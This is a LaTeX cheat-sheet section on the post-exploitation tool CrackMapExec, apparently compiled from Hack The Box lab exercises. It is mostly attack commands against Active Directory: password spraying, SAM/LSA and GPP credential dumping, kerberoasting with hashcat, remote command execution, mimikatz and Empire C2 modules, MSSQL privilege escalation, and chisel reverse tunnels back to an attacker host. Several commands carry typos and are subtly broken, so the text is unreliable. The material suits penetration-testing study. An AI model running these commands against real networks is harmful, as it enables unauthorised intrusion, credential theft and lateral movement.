\section{CrackMapExec}
\label{tool:crackmapexec}
\subsection*{Introduction}
\href{https://mpgn.gitbook.io/crackmapexec/}{CrackMapExec} (a.k.a CME) is a post-exploitation tool that helps automate
assessing the security of large Active Directory networks. Built with stealth
in mind, CME follows the concept of "Living off the Land": abusing built-in
Active Directory features/protocols to achieve it's functionality and allowing
it to evade most endpoint protection/IDS/IPS solutions.


CME makes heavy use of Impacket and PowerSploit for working with network protocols and performing a variety of post-exploitation techniques.

\subsection*{General}

\subsubsection*{Target format}
\begin{verbatim}
crackmapexec PROTO <FQDN>
crackmapexec PRTOTO <IP> <IP> ...

crackmapexec <PROTO> <IP RANGE> <IP RANGE> ... # 192..168.2.3-67
crackmapexec <PROTO> <FILE>
\end{verbatim}

\subsubsection*{Authentication}
Id (stored in cmedb proto)
\begin{verbatim}
rackmapexec PROTO TARGET_SPEC -id ID
\end{verbatim}


Login / password
\begin{verbatim}
crackmapexec PROTO TARGET_SPEC -u username -p 'Admin!123@'
# local account
crackmapexec PROTO TARGET_SPEC -u username -p 'Admin!123@' --local-auth
# if begin with dash
crackmapexec PROTO TARGET_SPEC -u='-username' -p='-Admin!123@'
\end{verbatim}

Login / Hash
\begin{verbatim}
crackmapexec PROTO TARGET_SPEC -u username -H HASH

# local account
crackmapexec PROTO TARGET_SPEC -u username -H HASH --local-auth
\end{verbatim}


Kerberos:\\
(\verb+KRB5CCNAME+ env name to specify the path to the
\href{https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html}{ccache
ticket})
\begin{verbatim}
$ getTGT.py inlanefreight.htb/robert:'Inlanefreight01!' -dc-ip 10.129.203.121
$ export KRB5CCNAME=$(pwd)/rober.ccache
$ crackmapexec smb 10.129.203.121 --use-kcache
\end{verbatim}

CME also support kerberos auth starting with a username/password or
username/hash
\begin{verbatim}
$ cme smb 10.129.203.121 -u robert -p Inlanefreight01! --kerberos --shares
\end{verbatim}

need to add the DC and ths target in \verb+/etc/hosts+ for nameresolution

\begin{verbatim}
$ secretsdump.py 
$ crackmapexec smb 10.129.203.121 -u julio --aesKey 77da70...SNIP...7d10e4df76
\end{verbatim}


\subsubsection*{Using modules}
\begin{verbatim}
# list modules
cme PROTO -L
# view a modules supported options, e.g:
cme PROTO -M <module name> --options 

cme PROTO TARGET_SPEC LOGIN_SPEC -M mimikatz -o COMMAND='privilege::debug'
\end{verbatim}


\subsubsection*{Bloodhound integration}
 \verb+~/.cme/cme.conf+
\begin{verbatim}
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = user
bh_pass = pass
\end{verbatim}

Collect data
\begin{verbatim}
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 \
    --put-file SharpHound.exe SharpHound.exe
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 \
    -x "C:\SharpHound.exe -c All && dir c:\*_BloodHound.zip"
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 \
    --get-file 20221109095424_BloodHound.zip bloodhound.zip
\end{verbatim}

then the user will automatically be marked as own except for some options such
as \verb+--ntds+, \verb+--lsa+

\verb+bh_owned+ module allow to mark a computer as own when accessing with a
local admin
\begin{verbatim}
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 \
    -M bh_owned -o PASS=HackTheBoxCME!
\end{verbatim}


\subsubsection*{Database General Usage}
All workspaces and their relative databases are stored in
\verb+~/.cme/workspaces+

\begin{verbatim}
cmedb

help

#creta a workspace
workspace create test

#swhich workspace
workspace NAME 
# acceds sub-workspace proto
proto PROTO 

back

# INSIDE A PROTO
creds 
creds hash
creds plaintext
hosts
hosts <name>
shares

creds add ...
creds remove <id>

# import creds from empire
import empire

export

\end{verbatim}

\subsection*{Proxychain CME}

upload chisel on target:
\begin{verbatim}
$ cme smb 10.129.204.133 -u grace -p Inlanefreight01! \
    --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
\end{verbatim}

\subsubsection*{Attacker as server}

\begin{verbatim}
$ ./chisel server -p 8080 --reverse 
$ cme smb 10.129.204.133 -u grace -p Inlanefreight01! \
    -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"
$ netstat -lnpt | grep 1080
$ proxychains -q cme smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
\end{verbatim}

Killing chisel:
\begin{verbatim}
$ crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! \
    -X "Stop-Process -Name chisel -Force"
\end{verbatim}

\subsubsection*{Attacker as client}
\begin{verbatim}
$ cme smb 10.129.204.133 -u grace -p Inlanefreight01! \
    -x "C:\Windows\Temp\chisel.exe server -p 9999 --socks5"
$ sudo chisel client 10.129.204.133:9999 socks


$ proxychains4 -q cme smb 172.16.1.10 -u grace -p Inlanefreight01! --shares
\end{verbatim}


bsubsection*{SMB}

\subsubsection*{Authentication}

For Null session ommit login / password params

For Anonymous \verb+-u 'a' -p ''+

For Domain NT hash \verb+-u Administrator -H 'NT_HASH'+

For Domain full hash (NTLM) 
\verb+-u Administrator -H 'NT_HASH:LM_HASH'+


\subsubsection*{Scan for vulnerabilities}
\begin{verbatim}
crackmapexec smb TARGET_SPEC  -u '' -p '' -M zerologo
crackmapexec smb TARGET_SPEC  -u '' -p '' -M petitpotam
crackmapexec smb TARGET_SPEC  -u 'user' -p 'pass' -M nopac
crackmapexec smb TARGET_SPEC  -u 'user' -p 'pass' -M dfscoerce
crackmapexec smb TARGET_SPEC  -u 'user' -p 'pass' -M shadowcoerce
crackmapexec smb TARGET_SPEC  -u 'user' -p 'pass' -M ms17-010
\end{verbatim}


\subsubsection*{output}

\begin{verbatim}
--export [full path]
--export $(pwd)/export.txt
$ sed -i "s/'/\"/g" export.txt

\end{verbatim}

\begin{verbatim}


$ sed -i "s/'/\"/g" users.txt
$ jq -r '.[]' users.txt > userslist.txt
$ cat userslist.txt
\end{verbatim}

\subsubsection*{Enumeration}
\label{tool:crackmapexec:smb:enum}

\begin{itemize}
    \item hosts: ip or list of ip or cidr or domain or file
    \item active sessions (\verb+--sessions+)
    \item shares and access (\verb+--shares+)
    \item disks (\verb+--disks+)
    \item logged on users (\verb+--loggeon-users+)
    \item domain users (\verb+--users [USER]+)
    \item RID bruteforce (\verb+--rid-brute [MAX_ID]+) useful when dealing with a domain
        that has NULL Authentication but has certain query restrictions.
    \item domain groups (\verb+--groups [GROUP]+)
    \item local groups (\verb+--local-group [GROUP]+)
    \item password policy (\verb+--pass-pol+)
    \item hosts without SMB signing required (\verb+--gen-relay-list FILE+)
\end{itemize}

\subsubsection*{Password and local admin spraying}
\label{tool:crackmapexec:smb:spraying}

\verb+--local-auth+ for local accoount brute force.

\verb+-u+ and \verb+-v+ can accept either a file or a list of value (space
separetad).

By default CME stop at the fist match except if parameter
\verb+--continue-on-success+ is specified

With 2 lists  and without \verb+--no-bruteforce+ option CME will perform every
couple.

\begin{verbatim}
crackmapexec smb IP -u USER_FILE -p PASSWORD_1 PASSWORD_2 ... 
crackmapexec smb IP -u USER_1 USER_2 ... -p PASSWORD ... 
\end{verbatim}


Local Admin Spraying
\label{tool:crackmapexec:localadmin-spraying}
\begin{verbatim}
crackmapexec smb --local-auth TARGET_SPEC LOGIN_SPEC
\end{verbatim}

To filter Logon failure use \verb-| grep +-

\subsubsection*{Dumping credentials}
\label{tool:crackmapexec:smb:cred-dumping}
\begin{verbatim}
# SAM
crackmapexec smb TARGET_SPEC LOGIN_SPEC --sam

# LSA
crackmapexec smb TARGET_SPEC LOGIN_SPEC --lsa
\end{verbatim}

\subsubsection*{Accounts in Group Policy Objects}
\begin{verbatim}
$ crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_password
$ crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_autologin
\end{verbatim}

\subsubsection*{Spidering Share}
\begin{verbatim}
--spider ShareName --pattern pass
--spider ShareName -regex .
--spider ShareName --pattern pass --content
--share ShareName --get-file Creds.txt Creds.txt
--share ShareName --put-file /etc/passwd passwd --smb-timeout X

-M spider_plus --share SHARE_NAME
-M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
$ cat /tmp/cme_spider_plus/10.129.203.121.json
-M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=fals
\end{verbatim}

\subsubsection*{Remote code execution}
\label{tool:crackmapexec:smb:rce}

\verb+-x+ to run cmd commands or \verb+-X+ to run PowerShell commands.

by default  CrackMapExec will try to execute the atexec
method~\ref{tools:impacket:atexec} if it fails try with 
\verb+--exec-method smbexec+

\verb+cme smb TARGET_SPEC LOGIN_SPEC -x 'CMD' --exec-method smbexec+

\subsubsection*{C2}

with empire:
\begin{itemize}
    \item edit cme.conf
    \item setup an http listener in empire
    \item \verb+$cme  smb ... -M empire_exec -o LISTENER=http+
\end{itemize}

\subsection*{LDAP}
might need to add dc to hosts
\subsubsection*{Password spraying / bruteforce}

\begin{verbatim}
$ crackmapexec ldap 10.129.203.121 -u julio grace -p Inlanefreight01!
\end{verbatim}



\subsubsection*{ASREPRoast}
\label{tool:crackmapexec:smb:asreproast}
\begin{verbatim}
$ crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' \
    --asreproast asreproast.out
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! \
    --asreproast asreproast.out
\end{verbatim}

\subsubsection*{kerberoasting}
\label{tool:crackmapexec:ldap:kerberoasting}

\begin{verbatim}
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' \
    --kerberoasting kerberoasting.out
$ hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt

# testing
$ crackmapexec smb 10.129.203.121 -u peter -p Password123

\end{verbatim}


\subsubsection*{Group Managed Service Accounts}
\label{tool:crackmapexec:ldap:gmsa}

\begin{verbatim}
$ crackmapexec winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! \
    -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"
...SNIP...
PrincipalsAllowedToRetrieveManagedPassword : {CN=engels,CN=Users,DC=inlanefreight,DC=htb}
...SNIP...

$ crackmapexec ldap dc01.inlanefreight.htb -u engels -p Inlanefreight1998! --gmsa
\end{verbatim}



\subsection*{WinRM}
\subsubsection*{Password spraying / bruteforce}
\label{tool:crackmapexec:winrm:bruteforce}

\begin{verbatim}
$ crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt \
    --no-bruteforce --continue-on-success

\end{verbatim}
\verb+crackmapexec winrm IP -u user.list -p password.list+

\subsubsection*{}
\begin{verbatim}
\end{verbatim}

\subsection*{MSSQL}
\subsubsection*{Password spraying / bruteforce}
\begin{verbatim}
# AD account
$ crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01!
# Local account
$ crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .
# SQL account
$ crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! \
    --local-auth
\end{verbatim}

When we find an account, CrackMapExec will automatically check if the user is a
DBA account or not. If we notice the output \verb+Pwn3d!+, the user is a
Database Administrator.

\subsubsection*{Interaction}
\begin{verbatim}
# Request
$ crackmapexec mssql 10.129.203.121 -u grace -p Inlanefreight01! \
    -q "SELECT name FROM master.dbo.sysdatabases"
$ cme mssql 10.129.97.23 -u engels   -p Inlanefreight1998! \
    -q "SELECT * from  [core_app].[dbo].tbl_flag" 

# Execute command
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! \
    --local-auth -x whoami

# upload file
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! \
    --local-auth --put-file /etc/passwd C:/Users/Public/passwd

# download
$ crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth \
    --get-file C:/Windows/System32/drivers/etc/hosts hosts
\end{verbatim}


\subsubsection*{Privesc}
\begin{verbatim}
# check
$ crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
# exec
$ crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! \
    -M mssql_priv -o ACTION=privesc
# rollback
$ crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! \
    -M mssql_priv -o ACTION=rollback
\end{verbatim}

\subsection*{FTP}
\subsubsection*{Password spraying / bruteforce}
same as MSSQL

\subsection*{SSH}
\subsubsection*{Password spraying / bruteforce}
same as MSSQL

